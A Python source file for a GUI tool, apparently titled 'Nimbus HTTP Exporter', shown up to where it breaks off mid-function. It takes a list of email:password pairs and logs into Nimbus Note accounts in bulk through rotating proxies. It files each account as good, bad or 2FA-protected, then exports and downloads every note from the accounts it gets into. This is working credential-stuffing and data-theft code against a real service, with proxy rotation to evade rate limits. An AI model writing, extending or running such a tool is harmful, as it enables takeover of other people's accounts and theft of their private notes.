from __future__ import annotations
import sys, asyncio, time, json, re, random
from dataclasses import dataclass
from pathlib import Path
from typing import Optional, List, Dict, Any, Tuple, Callable
from httpx import Response
import httpx
from httpx_socks import SyncProxyTransport
import socketio
import aiohttp
from aiohttp_socks import ProxyConnector

try:
    from PySide6.QtWidgets import (

        QApplication,
        QWidget,
        QVBoxLayout,
        QHBoxLayout,
        QLabel,
        QPushButton,
        QTextEdit,
        QFileDialog,
        QSpinBox,
        QLineEdit,
        QCheckBox,
        QComboBox,

    )
    from PySide6.QtCore import QThread, Signal, QTimer
    GUI_AVAILABLE = True
except Exception:
    GUI_AVAILABLE = False

USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
DEFAULT_PROXY_SCHEME = "socks5"
HEADERS_POOL = {
    "User-Agent": USER_AGENT,
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate, br",
    "Connection": "keep-alive",
    "Upgrade-Insecure-Requests": "1",
    "Sec-Fetch-Dest": "document",
    "Sec-Fetch-Mode": "navigate",
    "Sec-Fetch-Site": "none",
    "Sec-Fetch-User": "?1",
}

class BadCredentials(Exception):
    def __init__(self, msg: str, response: Response | None = None):
        super().__init__(msg)
        self.response = response

class TwoFARequired(Exception):
    pass

@dataclass
class User:
    session_id: str
    domain: str

class NimbusClient:
    def __init__(self, proxy_url: Optional[str] = None, timeout: float = 60.0):
        transport = None
        if proxy_url and proxy_url.startswith(("socks5://", "socks4://", "socks://")):
            transport = SyncProxyTransport.from_url(proxy_url)
        client_kwargs = {
            "headers": {
                "User-Agent": USER_AGENT,
                "Accept": "*/*",
                "Accept-Language": "en-GB,en;q=0.5",
            },
            "timeout": timeout,
            "follow_redirects": True,
        }
        if transport is not None:
            client_kwargs["transport"] = transport
        elif proxy_url is not None:
            client_kwargs["proxies"] = proxy_url
        self.client = httpx.Client(**client_kwargs)
        self.session_id: Optional[str] = None
        self.domain: Optional[str] = None

    def close(self):
        self.client.close()

    def login(self, email: str, password: str, *, return_raw: bool = False):
        try:
            r = self.client.post(
                "https://nimbusweb.me/auth/api/auth",
                json={"login": email, "password": password},
                headers={
                    "Content-Type": "application/json; charset=UTF-8",
                    "Referer": "https://nimbusweb.me/auth",
                },
            )
            r.raise_for_status()
            data = r.json()
            code = data.get("errorCode")
            if code != 0:
                raise BadCredentials(f"errorCode={code}", r)
            sid = data["body"]["sessionId"]
            self.client.cookies.set("eversessionid", sid, domain=".nimbusweb.me")
            h = self.client.head("https://nimbusweb.me/client?t=regfsour:header", headers={"Referer": "https://nimbusweb.me/client"})
            if not h.is_success:
                raise TwoFARequired("domain head failed")
            host = httpx.URL(str(h.url)).host
            self.client.cookies.set("eversessionid", sid, domain=f".{host}")
            self.session_id = sid
            self.domain = host
            user = User(session_id=sid, domain=host)
            return (user, data, r) if return_raw else user
        except httpx.HTTPStatusError as e:
            raise BadCredentials(f"HTTP error during login: {e.response.status_code} {e.response.reason_phrase}", e.response)
        except ValueError:
            raise BadCredentials("Invalid JSON response during login")
        except KeyError:
            raise BadCredentials("Missing expected fields in login response")

    def get_organizations(self) -> List[Dict[str, Any]]:
        r = self.client.get("https://teams.nimbusweb.me/api/organizations", headers={"Referer": "https://teams.nimbusweb.me/client"})
        r.raise_for_status()
        return r.json()

    def get_workspaces(self, org_id: str) -> List[Dict[str, Any]]:
        r = self.client.get(f"https://teams.nimbusweb.me/api/workspaces/{org_id}", headers={"Referer": "https://teams.nimbusweb.me/client"})
        r.raise_for_status()
        return r.json()

    def list_notes(self, workspace: Dict[str, Any], page_size: int = 500) -> List[Dict[str, Any]]:
        if not self.domain or not self.session_id:
            raise RuntimeError("no session")
        total = workspace.get("notesCount", 0)
        notes: List[Dict[str, Any]] = []
        offset = 0
        while offset < total:
            rng = json.dumps({"limit": page_size, "offset": offset})
            r = self.client.get(
                f"https://{self.domain}/api/workspaces/{workspace['globalId']}/notes",
                params={"range": rng},
                headers={"Referer": f"https://{self.domain}/client"},
            )
            r.raise_for_status()
            notes.extend(r.json())
            offset += page_size
        return notes

    def get_note_tags(self, note: Dict[str, Any]) -> List[str]:
        if not self.domain:
            raise RuntimeError("no domain")
        r = self.client.get(
            f"https://{self.domain}/api/workspaces/{note['workspaceId']}/notes/{note['globalId']}/tags",
            headers={"Referer": f"https://{self.domain}/client"},
        )
        r.raise_for_status()
        return r.json()

    def start_export(self, note: Dict[str, Any], fmt: str = "html", timezone_minutes: int = 0) -> str:
        if not self.domain:
            raise RuntimeError("no domain")
        payload = {
            "language": "en",
            "timezone": timezone_minutes,
            "workspaceId": note["workspaceId"],
            "noteGlobalId": note["globalId"],
            "format": fmt,
            "style": "normal",
            "size": "normal",
            "paperFormat": "A4",
            "folders": {},
        }
        r = self.client.post(
            f"https://{self.domain}/api/workspaces/{note['workspaceId']}/notes/{note['globalId']}/export",
            json=payload,
            headers={"Referer": f"https://{self.domain}/client"},
        )
        r.raise_for_status()
        return r.json()["id"]


class AsyncNimbusClient:
    def __init__(self, proxy_url: Optional[str] = None, timeout: float = 60.0):
        transport = None
        if proxy_url and proxy_url.startswith(("socks5://", "socks4://", "socks://")):
            from httpx_socks import AsyncProxyTransport
            transport = AsyncProxyTransport.from_url(proxy_url)
        client_kwargs = {
            "headers": {
                "User-Agent": USER_AGENT,
                "Accept": "*/*",
                "Accept-Language": "en-GB,en;q=0.5",
            },
            "timeout": timeout,
            "follow_redirects": True,
        }
        if transport is not None:
            client_kwargs["transport"] = transport
        elif proxy_url is not None:
            client_kwargs["proxies"] = proxy_url
        self.client = httpx.AsyncClient(**client_kwargs)
        self.session_id: Optional[str] = None
        self.domain: Optional[str] = None

    async def close(self):
        await self.client.aclose()

    async def login(self, email: str, password: str, *, return_raw: bool = False):
        try:
            r = await self.client.post(
                "https://nimbusweb.me/auth/api/auth",
                json={"login": email, "password": password},
                headers={
                    "Content-Type": "application/json; charset=UTF-8",
                    "Referer": "https://nimbusweb.me/auth",
                },
            )
            r.raise_for_status()
            data = r.json()
            code = data.get("errorCode")
            if code != 0:
                raise BadCredentials(f"errorCode={code}", r)
            sid = data["body"]["sessionId"]
            self.client.cookies.set("eversessionid", sid, domain=".nimbusweb.me")
            h = await self.client.head(
                "https://nimbusweb.me/client?t=regfsour:header",
                headers={"Referer": "https://nimbusweb.me/client"},
            )
            if not h.is_success:
                raise TwoFARequired("domain head failed")
            host = httpx.URL(str(h.url)).host
            self.client.cookies.set("eversessionid", sid, domain=f".{host}")
            self.session_id = sid
            self.domain = host
            user = User(session_id=sid, domain=host)
            return (user, data, r) if return_raw else user
        except httpx.HTTPStatusError as e:
            raise BadCredentials(
                f"HTTP error during login: {e.response.status_code} {e.response.reason_phrase}",
                e.response,
            )
        except ValueError:
            raise BadCredentials("Invalid JSON response during login")
        except KeyError:
            raise BadCredentials("Missing expected fields in login response")

    async def get_organizations(self) -> List[Dict[str, Any]]:
        r = await self.client.get(
            "https://teams.nimbusweb.me/api/organizations",
            headers={"Referer": "https://teams.nimbusweb.me/client"},
        )
        r.raise_for_status()
        return r.json()

    async def get_workspaces(self, org_id: str) -> List[Dict[str, Any]]:
        r = await self.client.get(
            f"https://teams.nimbusweb.me/api/workspaces/{org_id}",
            headers={"Referer": "https://teams.nimbusweb.me/client"},
        )
        r.raise_for_status()
        return r.json()

    async def list_notes(self, workspace: Dict[str, Any], page_size: int = 500) -> List[Dict[str, Any]]:
        if not self.domain or not self.session_id:
            raise RuntimeError("no session")
        total = workspace.get("notesCount", 0)
        notes: List[Dict[str, Any]] = []
        offset = 0
        while offset < total:
            rng = json.dumps({"limit": page_size, "offset": offset})
            r = await self.client.get(
                f"https://{self.domain}/api/workspaces/{workspace['globalId']}/notes",
                params={"range": rng},
                headers={"Referer": f"https://{self.domain}/client"},
            )
            r.raise_for_status()
            notes.extend(r.json())
            offset += page_size
        return notes

    async def get_note_tags(self, note: Dict[str, Any]) -> List[str]:
        if not self.domain:
            raise RuntimeError("no domain")
        r = await self.client.get(
            f"https://{self.domain}/api/workspaces/{note['workspaceId']}/notes/{note['globalId']}/tags",
            headers={"Referer": f"https://{self.domain}/client"},
        )
        r.raise_for_status()
        return r.json()

    async def start_export(self, note: Dict[str, Any], fmt: str = "html", timezone_minutes: int = 0) -> str:
        if not self.domain:
            raise RuntimeError("no domain")
        payload = {
            "language": "en",
            "timezone": timezone_minutes,
            "workspaceId": note["workspaceId"],
            "noteGlobalId": note["globalId"],
            "format": fmt,
            "style": "normal",
            "size": "normal",
            "paperFormat": "A4",
            "folders": {},
        }
        r = await self.client.post(
            f"https://{self.domain}/api/workspaces/{note['workspaceId']}/notes/{note['globalId']}/export",
            json=payload,
            headers={"Referer": f"https://{self.domain}/client"},
        )
        r.raise_for_status()
        return r.json()["id"]

class ExportWatcher:
    def __init__(self, user: User, proxy_url: Optional[str] = None):
        self.user = user
        self.proxy_url = proxy_url
        self.sio: Optional[socketio.AsyncClient] = None
        self.session: Optional[aiohttp.ClientSession] = None
        self.connected = asyncio.Event()
        self.messages: List[Dict[str, Any]] = []

    async def __aenter__(self):
        headers = {"Cookie": f"eversessionid={self.user.session_id}"}
        url = f"https://{self.user.domain}"
        connector = ProxyConnector.from_url(self.proxy_url) if self.proxy_url else aiohttp.TCPConnector()
        self.session = aiohttp.ClientSession(connector=connector)
        self.sio = socketio.AsyncClient(logger=False, engineio_logger=False, http_session=self.session)

        @self.sio.on("socketConnect:userConnected")
        async def _a(msg):  # pragma: no cover - simple event handler
            self.connected.set()

        @self.sio.on("job:success")
        async def _b(event):  # pragma: no cover - simple event handler
            if event and isinstance(event, dict) and event.get("message", {}).get("fileUrl"):
                self.messages.append(event)

        await self.sio.connect(url, headers=headers, transports=["websocket"])
        await self.connected.wait()
        return self

    async def __aexit__(self, exc_type, exc, tb):
        if self.sio:
            await self.sio.disconnect()
        if self.session:
            await self.session.close()

# proxy helpers

def safe(s: str) -> str:
    return ''.join(ch if ch.isalnum() or ch in '@._-' else '_' for ch in s)

def append_line(path: Path, line: str) -> None:
    path.parent.mkdir(parents=True, exist_ok=True)
    with path.open('a', encoding='utf-8') as f:
        f.write(line + "\n")

def normalize_proxy(line: str, default_scheme: str = DEFAULT_PROXY_SCHEME) -> str:
    s = line.strip()
    if not s:
        return s
    low = s.lower()
    if low.startswith(("http://", "https://", "socks5://", "socks4://", "socks://")):
        return s
    return f"{default_scheme}://{s}"

def load_proxies_from_text(text: str, default_scheme: str = DEFAULT_PROXY_SCHEME) -> List[str]:
    items: List[str] = []
    for ln in text.splitlines():
        ln = ln.strip()
        if not ln or ln.startswith('#'):
            continue
        items.append(normalize_proxy(ln, default_scheme))
    return items

def fetch_pool(url: str) -> str:
    headers = dict(HEADERS_POOL)
    try:
        with httpx.Client(headers=headers, timeout=30.0, follow_redirects=True, http2=True) as c:
            r = c.get(url)
            r.raise_for_status()
            return r.text or ""
    except httpx.HTTPStatusError as e:
        raise Exception(f"HTTP error fetching pool: {e.response.status_code} {e.response.reason_phrase} - {e.response.text[:200]}")
    except httpx.TimeoutException:
        raise Exception("Timeout while fetching proxy pool")
    except httpx.ProxyError:
        raise Exception("Proxy error while fetching pool")
    except Exception as e:
        raise Exception(f"Unexpected error fetching pool: {str(e)}")

class ProxyRotator:
    def __init__(
        self,
        proxies: List[str],
        ttl_minutes: int,
        fetch_url: Optional[str] = None,
        enabled: bool = True,
        default_scheme: str = DEFAULT_PROXY_SCHEME,
    ):
        self.default_scheme = default_scheme
        self.proxies = [normalize_proxy(p, self.default_scheme) for p in (proxies or [])]
        self.fetch_url = fetch_url
        self.ttl_ms = ttl_minutes * 60_000
        self._cur: Optional[str] = None
        self._until = 0
        self.enabled = enabled

    def set_enabled(self, val: bool) -> None:
        self.enabled = val

    async def current(self) -> Optional[str]:
        if not self.enabled:
            return None
        now = int(time.time() * 1000)
        if self.fetch_url and (not self._cur or now >= self._until):
            try:
                text = fetch_pool(self.fetch_url)
                lines = load_proxies_from_text(text, self.default_scheme)
                self.proxies = lines
                self._cur = None
                self._until = now + self.ttl_ms
            except Exception as e:
                raise e  # Let the caller handle
        if not self.proxies:
            return None
        if not self._cur or now >= self._until:
            self._cur = random.choice(self.proxies)
            self._until = now + self.ttl_ms
        return self._cur

    def invalidate(self):
        self._until = 0

    def remove_proxy(self, proxy: str) -> None:
        if not proxy:
            return
        try:
            self.proxies.remove(proxy)
        except ValueError:
            return
        if self._cur == proxy:
            self._cur = None
            self._until = 0

    def set_list(self, proxies: List[str]):
        self.proxies = [normalize_proxy(p, self.default_scheme) for p in proxies]
        self._cur = None
        self._until = 0

    def count(self) -> int:
        return len(self.proxies)

# io helpers

def read_lines(path: Optional[Path]) -> List[str]:
    if not path or not path.exists():
        return []
    return [ln.strip() for ln in path.read_text(encoding="utf-8", errors="ignore").splitlines() if ln.strip() and not ln.strip().startswith('#')]

def read_accounts(path: Path) -> List[Tuple[str,str]]:
    items: List[Tuple[str,str]] = []
    for ln in read_lines(path):
        if ':' not in ln:
            raise ValueError(f"bad accounts line: {ln}")
        email, pwd = ln.split(':',1)
        items.append((email.strip(), pwd.strip()))
    return items

# core batch

async def export_one_account(
    email: str,
    password: str,
    out_root: Path,
    rot: ProxyRotator,
    retries_account: int,
    note_conc: int,
    download_timeout: float,
    log: Callable[[str], None] | None,
    extended_log: bool = False,
    stop_event: Optional[asyncio.Event] = None,
    use_async: bool = False,
) -> Tuple[str, bool, int, str]:
    stop_event = stop_event or asyncio.Event()
    attempts = 0
    last_err = ""
    while attempts < retries_account and not stop_event.is_set():
        attempts += 1
        try:
            proxy = await rot.current()
            if log:
                log(f"{email}:{password} try {attempts}/{retries_account} proxy={proxy or 'none'}")
        except Exception as e:
            last_err = f"Proxy fetch error: {str(e)}"
            if log:
                log(f"{email}:{password} {last_err}")
            await asyncio.sleep(1)
            continue
        client = AsyncNimbusClient(proxy_url=proxy) if use_async else NimbusClient(proxy_url=proxy)
        try:
            if use_async:
                user, resp_data, resp = await client.login(email, password, return_raw=True)
            else:
                user, resp_data, resp = await asyncio.to_thread(
                    client.login, email, password, return_raw=True
                )
            if log: log(f"{email}:{password} Logged in successfully")
            if extended_log and log:
                log(f"{email}:{password} login status: {resp.status_code}")
                log(f"{email}:{password} login headers: {dict(resp.headers)}")
                log(f"{email}:{password} login body: {resp.text}")
            # Здесь можно проанализировать resp_data и определить свои статусы
            # Например:
            # if resp_data.get('status') == 'bad':
            #     return email, False, 0, 'BAD'
            workspaces: List[Dict[str, Any]] = []
            if use_async:
                for org in await client.get_organizations():
                    workspaces.extend(await client.get_workspaces(org["globalId"]))
                notes: List[Dict[str, Any]] = []
                for w in workspaces:
                    notes.extend(await client.list_notes(w))
                for n in notes:
                    try:
                        n["tags"] = await client.get_note_tags(n)
                    except Exception:
                        n["tags"] = []
            else:
                for org in await asyncio.to_thread(client.get_organizations):
                    workspaces.extend(
                        await asyncio.to_thread(client.get_workspaces, org["globalId"])
                    )
                notes: List[Dict[str, Any]] = []
                for w in workspaces:
                    notes.extend(await asyncio.to_thread(client.list_notes, w))
                for n in notes:
                    try:
                        n["tags"] = await asyncio.to_thread(client.get_note_tags, n)
                    except Exception:
                        n["tags"] = []
            if not notes:
                client.close()
                if log: log(f"{email}:{password} No notes found, considering success")
                return email, True, 0, ''
            out_dir = out_root / safe(email)
            out_dir.mkdir(parents=True, exist_ok=True)
            async with ExportWatcher(user, proxy_url=proxy) as watcher:
                sem = asyncio.Semaphore(note_conc)
                loop = asyncio.get_running_loop()
                async def start(n):
                    async with sem:
                        if use_async:
                            await client.start_export(n, 'html', 0)
                        else:
                            await loop.run_in_executor(None, client.start_export, n, 'html', 0)
                await asyncio.gather(*(start(n) for n in notes))
                deadline = time.time() + 300
                while time.time() < deadline and len(watcher.messages) < len(notes):
                    await asyncio.sleep(1)
            downloaded = 0
            dl_kwargs = {"headers": {"User-Agent": USER_AGENT}, "timeout": download_timeout}
            if proxy is not None:
                dl_kwargs["proxies"] = proxy
            dl = httpx.AsyncClient(**dl_kwargs) if use_async else httpx.Client(**dl_kwargs)
            try:
                for ev in watcher.messages:
                    msg = ev.get("message", {})
                    url = msg.get("fileUrl")
                    name = msg.get("fileName") or f"{msg.get('uuid','export')}.zip"
                    if not url:
                        continue
                    p = out_dir / name
                    if use_async:
                        async with dl.stream("GET", url) as r:
                            r.raise_for_status()
                            with open(p, "wb") as f:
                                async for chunk in r.aiter_bytes():
                                    f.write(chunk)
                    else:
                        def _download():
                            with dl.stream("GET", url) as r:
                                r.raise_for_status()
                                with open(p, "wb") as f:
                                    for chunk in r.iter_bytes():
                                        f.write(chunk)
                        await asyncio.to_thread(_download)
                    downloaded += 1
                    if log:
                        log(f"{email}:{password} Downloaded {name}")
            finally:
                if use_async:
                    await dl.aclose()
                    await client.close()
                else:
                    dl.close()
                    client.close()
            if log: log(f"{email}:{password} Success, downloaded {downloaded} files")
            return email, True, downloaded, ''
        except BadCredentials as e:
            client.close()
            last_err = str(e)
            if e.response is not None and e.response.status_code == 429:
                if log:
                    log(f"{email}:{password} {last_err}")
                return email, False, 0, "429"
            if log:
                log(f"{email}:{password} Bad credentials - {last_err}")
            if extended_log and log and getattr(e, "response", None):
                log(f"{email}:{password} response status: {e.response.status_code}")
                log(f"{email}:{password} response headers: {dict(e.response.headers)}")
                log(f"{email}:{password} response body: {e.response.text}")
            return email, False, 0, "BAD"
        except TwoFARequired as e:
            client.close()
            last_err = str(e)
            if log: log(f"{email}:{password} 2FA required - {last_err}")
            return email, False, 0, '2FA'
        except httpx.HTTPStatusError as e:
            last_err = f"HTTP error: {e.response.status_code} - {e.response.text[:200]}"
            if log: log(f"{email}:{password} {last_err}")
            if extended_log and log:
                log(f"{email}:{password} response status: {e.response.status_code}")
                log(f"{email}:{password} response headers: {dict(e.response.headers)}")
                log(f"{email}:{password} response body: {e.response.text}")
            client.close()
            if e.response.status_code in (401, 403):
                return email, False, 0, 'BAD'
            if e.response.status_code == 405:
                rot.remove_proxy(proxy)
            else:
                rot.invalidate()
            await asyncio.sleep(1)
        except Exception as e:
            last_err = str(e)
            if log: log(f"{email}:{password} Unexpected error - {last_err}")
            try: client.close()
            except Exception: pass
            err_low = last_err.lower()
            if any(k in err_low for k in ("10060", "timeout", "not allowed")):
                rot.remove_proxy(proxy)
            elif any(k in err_low for k in ("proxy","network","429","502","503","504","connection reset")):
                rot.invalidate()
            await asyncio.sleep(1)
    if log: log(f"{email}:{password} Failed after retries - {last_err}")
    return email, False, 0, last_err or 'unknown'

async def run_batch(
    accounts_file: Path,
    out_root: Path,
    rot: ProxyRotator,
    acc_conc: int,
    retries_account: int,
    note_conc: int,
    download_timeout: float,
    log_fn: Callable[[str], None] | None,
    stats_cb: Callable[[int, int, int, int, int, int], None] | None,
    extended_log: bool = False,
    stop_event: Optional[asyncio.Event] = None,
    pause_event: Optional[asyncio.Event] = None,
    use_async: bool = False,
) -> None:
    accounts = read_accounts(accounts_file)
    stop_event = stop_event or asyncio.Event()
    pause_event = pause_event or asyncio.Event()
    if not pause_event.is_set():
        pause_event.set()

    in_work = 0
    good = 0
    bad = 0
    error = 0
    exported = 0

    q: asyncio.Queue[Tuple[str, str]] = asyncio.Queue()
    for item in accounts:
        q.put_nowait(item)

    async def worker_loop():
        nonlocal in_work, good, bad, error, exported
        while not stop_event.is_set():
            await pause_event.wait()
            try:
                email, pwd = q.get_nowait()
            except asyncio.QueueEmpty:
                break
            in_work += 1
            if stats_cb:
                stats_cb(in_work, good, bad, error, exported, len(accounts))
            em, ok, cnt, err = await export_one_account(
                email,
                pwd,
                out_root,
                rot,
                retries_account,
                note_conc,
                download_timeout,
                log_fn,
                extended_log,
                stop_event,
                use_async,
            )
            in_work -= 1
            if ok:
                good += 1
                append_line(out_root / "Good.txt", f"{em}:{pwd}")
                if cnt > 0:
                    exported += 1
            else:
                if err == "BAD":
                    bad += 1
                    append_line(out_root / "BAD.txt", f"{em}:{pwd}")
                elif err == "2FA":
                    error += 1
                    append_line(out_root / "2fa.txt", f"{em}:{pwd}")
                elif err == "429":
                    error += 1
                    append_line(out_root / "429 Error ReCheck.txt", f"{em}:{pwd}")
                else:
                    error += 1
                    append_line(out_root / "ERROR.txt", f"{em}:{pwd} - {err}")
            if stats_cb:
                stats_cb(in_work, good, bad, error, exported, len(accounts))
            q.task_done()

    workers = [asyncio.create_task(worker_loop()) for _ in range(acc_conc)]
    await q.join()
    stop_event.set()
    for w in workers:
        w.cancel()
    await asyncio.gather(*workers, return_exceptions=True)

if GUI_AVAILABLE:
    class Worker(QThread):
        logsig = Signal(str)
        finsig = Signal()
        proxysig = Signal(int)
        statssig = Signal(str)

        def __init__(
            self,
            accounts_file: Path,
            proxies_file: Optional[Path],
            out_root: Path,
            proxy_url: Optional[str],
            proxy_ttl_min: int,
            acc_conc: int,
            retries_account: int,
            note_conc: int,
            download_timeout: float,
            no_proxy: bool = False,
            extended_log: bool = False,
            proxy_scheme: str = DEFAULT_PROXY_SCHEME,
            fast_mode: bool = False,
        ):
            super().__init__()
            self.accounts_file = accounts_file
            self.proxies_file = proxies_file
            self.out_root = out_root
            self.proxy_url = proxy_url
            self.proxy_ttl_min = proxy_ttl_min
            self.acc_conc = acc_conc
            self.retries_account = retries_account
            self.note_conc = note_conc
            self.download_timeout = download_timeout
            self.no_proxy = no_proxy
            self.extended_log = extended_log
            self.proxy_scheme = proxy_scheme
            self.fast_mode = fast_mode
            self.rot = ProxyRotator(
                read_lines(proxies_file) if proxies_file else [],
                proxy_ttl_min,
                proxy_url,
                not no_proxy,
                proxy_scheme,
            )
        def set_proxy_url(self, url: Optional[str]):
            self.proxy_url = url
            self.rot.fetch_url = url

        def set_proxy_scheme(self, scheme: str):
            self.proxy_scheme = scheme
            self.rot.default_scheme = scheme

        def set_no_proxy(self, val: bool):
            self.no_proxy = val
            self.rot.set_enabled(not val)

        def reload_proxies(self):
            if self.no_proxy:
                self.rot.set_list([])
                self.proxysig.emit(0)
                return

            raw_file_list = read_lines(self.proxies_file) if self.proxies_file else []
            lst = [normalize_proxy(x, self.proxy_scheme) for x in raw_file_list]
            pool_loaded = 0
            if self.proxy_url:
                try:
                    text = fetch_pool(self.proxy_url)
                    lines = load_proxies_from_text(text, self.proxy_scheme)
                    pool_loaded = len(lines)
                    lst.extend(lines)
                    self.logsig.emit(f"Proxy pool loaded successfully: {pool_loaded} proxies")
                except Exception as e:
                    self.logsig.emit(f"Proxy pool fetch error: {str(e)}")
            self.rot.set_list(lst)
            total = self.rot.count()
            self.logsig.emit(f"Proxy refresh: file={len(raw_file_list)} pool={pool_loaded} total={total}")
            self.proxysig.emit(total)

        def run(self):
            if sys.platform.startswith("win"):
                try:
                    asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
                except Exception:
                    pass

            self.loop = asyncio.new_event_loop()
            asyncio.set_event_loop(self.loop)
            self.stop_event = asyncio.Event()
            self.pause_event = asyncio.Event()
            self.pause_event.set()

            async def _run():
                def log_cb(msg: str):
                    self.logsig.emit(msg)

                def stats_cb(inwork: int, good: int, bad: int, err: int, exp: int, total: int):
                    self.statssig.emit(
                        f"In work: {inwork} | Good: {good} | Bad: {bad} | Error: {err} | Exported: {exp}/{total}"
                    )

                self.proxysig.emit(self.rot.count())
                try:
                    await run_batch(
                        self.accounts_file,
                        self.out_root,
                        self.rot,
                        self.acc_conc,
                        self.retries_account,
                        self.note_conc,
                        self.download_timeout,
                        log_cb,
                        stats_cb,
                        self.extended_log,
                        self.stop_event,
                        self.pause_event,
                        use_async=self.fast_mode,
                    )

                except Exception as e:
                    self.logsig.emit(f"ERROR: {e}")

            self.loop.run_until_complete(_run())
            self.finsig.emit()

        def request_stop(self):
            if getattr(self, "loop", None) and getattr(self, "stop_event", None):
                self.loop.call_soon_threadsafe(self.stop_event.set)

        def request_pause(self, pause: bool):
            if getattr(self, "loop", None) and getattr(self, "pause_event", None):
                if pause:
                    self.loop.call_soon_threadsafe(self.pause_event.clear)
                else:
                    self.loop.call_soon_threadsafe(self.pause_event.set)

    class App(QWidget):
        def __init__(self):
            super().__init__()
            self.setWindowTitle("Nimbus HTTP Exporter")
            lay = QVBoxLayout(self)
            self.btnAcc = QPushButton("accounts.txt")
            self.lblAcc = QLabel("—")
            self.btnAcc.clicked.connect(self.pickAcc)
            row = QHBoxLayout(); row.addWidget(self.btnAcc); row.addWidget(self.lblAcc); lay.addLayout(row)
            self.btnProx = QPushButton("proxies.txt (optional)")
            self.lblProx = QLabel("—")
            self.btnProx.clicked.connect(self.pickProx)
            row = QHBoxLayout(); row.addWidget(self.btnProx); row.addWidget(self.lblProx); lay.addLayout(row)
            self.poolEdit = QLineEdit(); self.poolEdit.setPlaceholderText("Proxy pool URL (optional)")
            lay.addWidget(self.poolEdit)
            self.schemeBox = QComboBox();
            self.schemeBox.addItems(["Socks5", "Socks4", "HTTP"])
            lay.addWidget(self.schemeBox)
            self.noProxyChk = QCheckBox("Без прокси")
            lay.addWidget(self.noProxyChk)
            self.verboseChk = QCheckBox("Расширенный лог")
            lay.addWidget(self.verboseChk)
            self.fastChk = QCheckBox("Быстрый режим")
            lay.addWidget(self.fastChk)


            self.proxyCountLbl = QLabel("Proxies: 0")
            self.refreshBtn = QPushButton("Refresh proxies")
            prow = QHBoxLayout(); prow.addWidget(self.proxyCountLbl); prow.addWidget(self.refreshBtn); lay.addLayout(prow)
            self.btnOut = QPushButton("Папка выгрузки")
            self.lblOut = QLabel(str(Path("exports").absolute()))
            self.outPath = Path("exports").absolute()
            self.btnOut.clicked.connect(self.pickOut)
            row = QHBoxLayout(); row.addWidget(self.btnOut); row.addWidget(self.lblOut); lay.addLayout(row)
            self.spinAcc = QSpinBox(); self.spinAcc.setRange(1, 50); self.spinAcc.setValue(2)
            self.spinNote = QSpinBox(); self.spinNote.setRange(1, 64); self.spinNote.setValue(8)
            self.spinRet = QSpinBox(); self.spinRet.setRange(1, 10); self.spinRet.setValue(3)
            self.spinTTL = QSpinBox(); self.spinTTL.setRange(1, 240); self.spinTTL.setValue(10)
            row = QHBoxLayout();
            row.addWidget(QLabel("Потоки аккаунтов:")); row.addWidget(self.spinAcc)
            row.addWidget(QLabel("Потоки заметок:")); row.addWidget(self.spinNote)
            row.addWidget(QLabel("Повторы/акк:")); row.addWidget(self.spinRet)
            row.addWidget(QLabel("TTL прокси (мин):")); row.addWidget(self.spinTTL)
            lay.addLayout(row)
            self.statsLbl = QLabel("In work: 0 | Good: 0 | Bad: 0 | Error: 0 | Exported: 0/0")
            lay.addWidget(self.statsLbl)
            self.log = QTextEdit(); self.log.setReadOnly(True); lay.addWidget(self.log)
            self.btnStart = QPushButton("Старт")
            self.btnStart.clicked.connect(self.start)
            lay.addWidget(self.btnStart)
            self.btnPause = QPushButton("Пауза")
            self.btnPause.setEnabled(False)
            self.btnPause.clicked.connect(self.togglePause)
            lay.addWidget(self.btnPause)
            self.btnStop = QPushButton("Стоп")
            self.btnStop.setEnabled(False)
            self.btnStop.clicked.connect(self.stop)
            lay.addWidget(self.btnStop)
            self.accounts: Optional[Path] = None
            self.proxies: Optional[Path] = None
            self.worker: Optional[Worker] = None
            self.refreshTimer = QTimer(self)
            self.refreshTimer.timeout.connect(self.onRefreshProxies)
            self.poolEdit.editingFinished.connect(self.onRefreshProxies)
            self.refreshBtn.clicked.connect(self.onRefreshProxies)

        def pickAcc(self):
            p, _ = QFileDialog.getOpenFileName(self, "accounts.txt", "", "Text (*.txt)")
            if p:
                self.accounts = Path(p); self.lblAcc.setText(p)

        def pickProx(self):
            p, _ = QFileDialog.getOpenFileName(self, "proxies.txt", "", "Text (*.txt)")
            if p:
                self.proxies = Path(p); self.lblProx.setText(p)

        def pickOut(self):
            p = QFileDialog.getExistingDirectory(self, "Папка выгрузки")
            if p:
                self.outPath = Path(p); self.lblOut.setText(p)

        def start(self):
            if not self.accounts:
                self.log.append("Укажи accounts.txt")
                return
            self.worker = Worker(
                accounts_file=self.accounts,
                proxies_file=self.proxies,
                out_root=self.outPath,
                proxy_url=self.poolEdit.text().strip() or None,
                proxy_ttl_min=self.spinTTL.value(),
                acc_conc=self.spinAcc.value(),
                retries_account=self.spinRet.value(),
                note_conc=self.spinNote.value(),
                download_timeout=180.0,
                no_proxy=self.noProxyChk.isChecked(),
                extended_log=self.verboseChk.isChecked(),
                proxy_scheme=self.schemeBox.currentText().lower(),
                fast_mode=self.fastChk.isChecked(),

            )
            self.worker.logsig.connect(self.onLog)
            self.worker.finsig.connect(self.onFin)
            self.worker.proxysig.connect(self.onProxyCount)
            self.worker.statssig.connect(self.onStats)
            self.worker.start()
            if not self.noProxyChk.isChecked():
                self.refreshTimer.start(self.spinTTL.value() * 60_000)
            self.btnStart.setEnabled(False)
            self.btnPause.setEnabled(True)
            self.btnStop.setEnabled(True)
            self.log.append("Старт...")

        def onRefreshProxies(self):
            if self.worker:
                self.worker.set_no_proxy(self.noProxyChk.isChecked())
                self.worker.set_proxy_url(self.poolEdit.text().strip() or None)
                self.worker.set_proxy_scheme(self.schemeBox.currentText().lower())
                self.worker.reload_proxies()
            else:
                if self.noProxyChk.isChecked():
                    self.proxyCountLbl.setText("Proxies: 0")
                    self.log.append("Proxy preview: disabled")
                else:
                    raw_file_list = read_lines(self.proxies) if self.proxies else []
                    lst = [normalize_proxy(x, self.schemeBox.currentText().lower()) for x in raw_file_list]
                    pool = self.poolEdit.text().strip()
                    pool_loaded = 0
                    if pool:
                        try:
                            text = fetch_pool(pool)
                            lines = load_proxies_from_text(text, self.schemeBox.currentText().lower())
                            pool_loaded = len(lines)
                            lst.extend(lines)
